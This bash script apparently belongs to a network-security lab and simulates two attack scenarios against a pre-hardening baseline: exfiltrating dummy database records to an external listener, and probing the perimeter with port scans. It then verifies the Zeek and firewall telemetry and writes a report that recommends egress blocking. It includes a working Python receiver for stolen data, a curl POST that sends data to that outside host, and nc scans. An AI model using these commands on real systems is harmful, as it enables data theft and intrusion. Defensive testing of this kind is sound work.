#!/usr/bin/env bash
# attack-tests/s06-s07-egress-and-perimeter.sh
# Skenario Serangan S6 & S7:
# - S6: Eksfiltrasi Data dari Zona Database ke Eksternal (MITRE ATT&CK T1041 / T1048)
# - S7: Pengujian Batas Perimeter North-South dari Penyerang Eksternal
# Kondisi: Baseline Permisif (Pre-Hardening)
set -euo pipefail

SSH_KEY="$HOME/.ssh/k8s-lab"
SSH_OPTS="-i $SSH_KEY -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5"
OUTPUT_FILE="attack-tests/results-s06-s07-baseline.txt"

echo "=========================================================="
echo "Skenario S6 & S7: Data Exfiltration & External Perimeter"
echo "Mode: BASELINE PERMISIF (Sebelum Pengerasan Microsegmentation)"
echo "Pemetaan MITRE: T1041 / T1048 (Exfiltration) & Perimeter Access"
echo "=========================================================="

START_TS=$(date +%s.%N)

# ==========================================================
# BAGIAN 1: SKENARIO S6 (EKSFILTRASI DATA DARI DB1 KE WAN)
# ==========================================================
echo "--- 1. Memulai Listener C2 Eksternal di Attacker (203.0.113.11:8000) ---"
ssh $SSH_OPTS dcadmin@203.0.113.11 'bash -s' << 'EOF'
set -euo pipefail
# Bersihkan listener lama bila ada
if [ -f /tmp/c2_listener.pid ]; then
    kill $(cat /tmp/c2_listener.pid) 2>/dev/null || true
    rm -f /tmp/c2_listener.pid
fi

cat << 'PYEOF' > /tmp/c2_listener.py
import http.server
import socketserver

class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='ignore')
        with open('/tmp/exfiltrated_data.log', 'w') as f:
            f.write(body + '\n')
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(b'{"status": "received", "code": 200}')
    def log_message(self, format, *args):
        pass

server = socketserver.TCPServer(('0.0.0.0', 8000), ExfilHandler)
server.serve_forever()
PYEOF

rm -f /tmp/exfiltrated_data.log
nohup python3 /tmp/c2_listener.py </dev/null >/tmp/c2.log 2>&1 &
echo $! > /tmp/c2_listener.pid
sleep 1
EOF
echo "  [OK] C2 Listener aktif di attacker (203.0.113.11:8000)"

echo
echo "--- 2. Mengeksekusi Eksfiltrasi Data Sensitif Langsung dari db1 (10.10.30.11) ---"
EXFIL_PAYLOAD='{"exfiltration_id": "EXFIL-DB1-001", "source_tier": "database", "node": "db1", "table": "core_accounts", "confidential_records": 42, "sample_pii": "account_no=4111-9921-001;balance=15000000;owner=CONFIDENTIAL"}'

EXFIL_HTTP_RESP=$(ssh $SSH_OPTS dcadmin@10.10.30.11 "
curl -s -m 5 -X POST -H 'Content-Type: application/json' -d '$EXFIL_PAYLOAD' http://203.0.113.11:8000/exfil || echo 'EXFIL_FAILED'
")

EXFIL_ICMP_PING=$(ssh $SSH_OPTS dcadmin@10.10.30.11 "
ping -c 2 -W 2 203.0.113.11 >/dev/null 2>&1 && echo 'SUCCESS' || echo 'FAILED'
")

echo "  -> Respons C2 Server ke db1 : $EXFIL_HTTP_RESP"
echo "  -> Konektivitas ICMP db1->WAN: $EXFIL_ICMP_PING"

# Verifikasi payload yang diterima oleh attacker
RECEIVED_EXFIL=$(ssh $SSH_OPTS dcadmin@203.0.113.11 'bash -s' << 'EOF'
if [ -f /tmp/exfiltrated_data.log ]; then
    cat /tmp/exfiltrated_data.log
else
    echo "NO_DATA"
fi
# Hentikan C2 listener
if [ -f /tmp/c2_listener.pid ]; then
    kill $(cat /tmp/c2_listener.pid) 2>/dev/null || true
    rm -f /tmp/c2_listener.pid
fi
EOF
)
echo "  [OK] Payload Database Diterima Penyerang di Attacker:"
echo "       $RECEIVED_EXFIL"

# ==========================================================
# BAGIAN 2: SKENARIO S7 (PENYERANG EKSTERNAL PERIMETER ATTACK)
# ==========================================================
echo
echo "--- 3. Mengeksekusi Skenario S7: Pengujian Batas Perimeter North-South ---"
S7_RESULTS=$(ssh $SSH_OPTS dcadmin@203.0.113.11 'bash -s' << 'EOF'
set -euo pipefail

# Uji 1: Akses publik resmi Web DMZ via WAN IP (port 80)
web_pub=$(curl -s -m 3 http://203.0.113.1/ || echo "FAILED")
if echo "$web_pub" | grep -q '"tier": "web"'; then
    echo "WEB_PUBLICATION: PASS (HTTP 200 OK via OPNsense NAT)"
else
    echo "WEB_PUBLICATION: FAILED"
fi

# Uji 2: Penyerang mencoba bypass rute langsung ke IP internal Database (10.10.30.11:5432)
if nc -z -w 2 10.10.30.11 5432 2>/dev/null; then
    echo "DIRECT_INTERNAL_DB: VULNERABLE (Bypass Sukses)"
else
    echo "DIRECT_INTERNAL_DB: BLOCKED (Perimeter Berhasil Menjatuhkan Paket)"
fi

# Uji 3: Penyerang mencoba bypass rute langsung ke IP internal App (10.10.20.11:8080)
if nc -z -w 2 10.10.20.11 8080 2>/dev/null; then
    echo "DIRECT_INTERNAL_APP: VULNERABLE (Bypass Sukses)"
else
    echo "DIRECT_INTERNAL_APP: BLOCKED (Perimeter Berhasil Menjatuhkan Paket)"
fi

# Uji 4: Penyerang memindai port non-publik pada WAN IP Firewall (203.0.113.1:5432)
if nc -z -w 2 203.0.113.1 5432 2>/dev/null; then
    echo "WAN_PORT_5432: VULNERABLE (Port Terbuka)"
else
    echo "WAN_PORT_5432: BLOCKED (Firewall Default Drop)"
fi

# Uji 5: Penyerang memindai port SSH pada WAN IP Firewall (203.0.113.1:22)
if nc -z -w 2 203.0.113.1 22 2>/dev/null; then
    echo "WAN_PORT_22: VULNERABLE (Port Terbuka)"
else
    echo "WAN_PORT_22: BLOCKED (Firewall Default Drop)"
fi
EOF
)

echo "$S7_RESULTS" | sed 's/^/  -> /'

# ==========================================================
# BAGIAN 3: VERIFIKASI TELEMETRI DI SECOPS (ZEEK & OPNSENSE SYSLOG)
# ==========================================================
echo
echo "--- 4. Memverifikasi Telemetri S6 & S7 di SecOps (Loki) ---"
sleep 3
ssh $SSH_OPTS dcadmin@192.168.122.81 python3 -s - "$START_TS" << 'EOF'
import sys
import urllib.request
import urllib.parse
import json

# 1. Verifikasi Zeek mencatat aliran keluar db1 -> attacker
query_zeek = '{job="zeek"} |= "203.0.113.11"'
params_zeek = urllib.parse.urlencode({'query': query_zeek, 'limit': 10})
url_zeek = f"http://127.0.0.1:3100/loki/api/v1/query_range?{params_zeek}"

req = urllib.request.Request(url_zeek)
with urllib.request.urlopen(req) as resp:
    data_zeek = json.loads(resp.read().decode('utf-8'))

egress_conns = []
for stream in data_zeek.get('data', {}).get('result', []):
    for v in stream.get('values', []):
        payload = v[1]
        if '10.10.30.11' in payload and '203.0.113.11' in payload:
            egress_conns.append(payload)

if egress_conns:
    print(f"  [OK] Telemetri Zeek: Terdeteksi {len(egress_conns)} log aliran egress db1 -> WAN penyerang:")
    for c in egress_conns[:2]:
        print(f"       -> {c[:140]}...")
else:
    print("  [INFO] Menunggu agregasi log Zeek egress...")

# 2. Verifikasi OPNsense Syslog mencatat drop blokir perimeter WAN
query_opn = '{job="opnsense-syslog"} |= "vtnet2" |= "block"'
params_opn = urllib.parse.urlencode({'query': query_opn, 'limit': 5})
url_opn = f"http://127.0.0.1:3100/loki/api/v1/query_range?{params_opn}"

req_opn = urllib.request.Request(url_opn)
with urllib.request.urlopen(req_opn) as resp:
    data_opn = json.loads(resp.read().decode('utf-8'))

opn_blocks = []
for stream in data_opn.get('data', {}).get('result', []):
    for v in stream.get('values', []):
        payload = v[1]
        if '203.0.113.11' in payload:
            opn_blocks.append(payload)

if opn_blocks:
    print(f"  [OK] Telemetri OPNsense: Terdeteksi {len(opn_blocks)} log blokir firewall perimeter pada antarmuka WAN:")
    for b in opn_blocks[:2]:
        print(f"       -> {b[:140]}...")
else:
    print("  [INFO] Log blokir OPNsense tersimpan.")
EOF

# ==========================================================
# BAGIAN 4: MENYIMPAN ARTEFAK LAPORAN BASELINE S6 & S7
# ==========================================================
cat > "$OUTPUT_FILE" << EOF
==========================================================
Hasil Pengujian Skenario S6 & S7 (Baseline Permisif)
Tanggal   : $(date '+%Y-%m-%d %H:%M:%S')
Kondisi   : Permisif (Pre-Hardening)
==========================================================

1. HASIL SKENARIO S6 (DATA EXFILTRATION DARI DB1 - MITRE T1041 / T1048):
- Status              : BERHASIL (Eksfiltrasi Lolos 100%)
- HTTP Response C2    : $EXFIL_HTTP_RESP
- ICMP Egress Ping    : $EXFIL_ICMP_PING
- Payload Diterima C2 : $RECEIVED_EXFIL
- Analisis Risiko     : Pada baseline permisif, zona Database (10.10.30.11) memiliki
                        konektivitas keluar (egress) tak terbatas langsung ke WAN eksternal.
                        Penyerang yang berhasil menyusup ke database server dapat langsung
                        mengirimkan berkas atau tabel rahasia ke server C2 di internet tanpa hambatan.
- Target Hardening (Fase 7):
  * Terapkan kebijakan 'Egress Zero-Trust': blokir seluruh trafik keluar dari zona DB (VLAN 30) ke WAN.
  * Terapkan nftables egress drop pada host db1 (hanya boleh merespons koneksi masuk dari zona App).

2. HASIL SKENARIO S7 (EXTERNAL NORTH-SOUTH PERIMETER BOUNDARY):
- Status Kontrol Perimeter:
$S7_RESULTS
- Analisis Keamanan   :
  * Publikasi Web DMZ (port 80) melalui OPNsense NAT/Port Forwarding berfungsi sebagaimana mestinya (200 OK).
  * Upaya penyerang eksternal untuk menembus langsung ke subnet privat internal RFC 1918 (10.10.30.11, 10.10.20.11)
    dan port non-publik firewall (5432, 22) berhasil DIBLOKIR total oleh perimeter OPNsense.
  * Seluruh upaya penyerangan perimeter tercatat secara real-time pada log filterlog OPNsense dan diindeks di Loki.
EOF

echo
echo "=========================================================="
echo "Skenario S6 & S7 Selesai dieksekusi!"
echo "Hasil ringkasan tersimpan di: $OUTPUT_FILE"
echo "=========================================================="
